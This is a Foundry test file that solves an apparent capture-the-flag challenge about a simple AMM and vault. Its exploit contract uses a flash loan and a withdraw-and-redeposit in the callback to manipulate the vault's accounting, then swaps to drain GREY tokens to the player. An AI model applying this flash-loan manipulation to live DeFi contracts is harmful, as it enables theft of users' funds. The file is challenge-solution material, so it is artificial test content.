// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/simple-amm-vault/Setup.sol";
import "../src/simple-amm-vault/lib/GREY.sol";

contract SimpleAMMTest is Test {
    Setup setup;
    GREY grey;
    address player = makeAddr("player");

    function setUp() public {
        setup = new Setup();
        grey = setup.grey();
    }

    function test_amm() public {
        vm.startPrank(player);
        setup.claim();
        assertEq(grey.balanceOf(player), 1000e18);
        SimpleAMMExploit exploit = new SimpleAMMExploit(setup, player);
        exploit.exploit();
        bool isSolved = setup.isSolved();
        assertTrue(isSolved);
        vm.stopPrank();
    }
}

contract SimpleAMMExploit {
    SimpleVault vault;
    SimpleAMM amm;
    GREY grey;
    address player;

    constructor(Setup setup, address _player) {
        vault = setup.vault();
        amm = setup.amm();
        grey = setup.grey();
        player = _player;
    }

    function exploit() public {
        amm.flashLoan(true, 1000e18, "");
        amm.swap(true, 0, 1000e18);
        grey.transfer(address(player), grey.balanceOf(address(this)));
    }

    function onFlashLoan(uint256 _assets, bytes calldata _data) public {
        vault.withdraw(1000e18);
        grey.approve(address(vault), 1000e18);
        vault.deposit(1000e18);
        vault.approve(address(amm), 1000e18);
    }
}
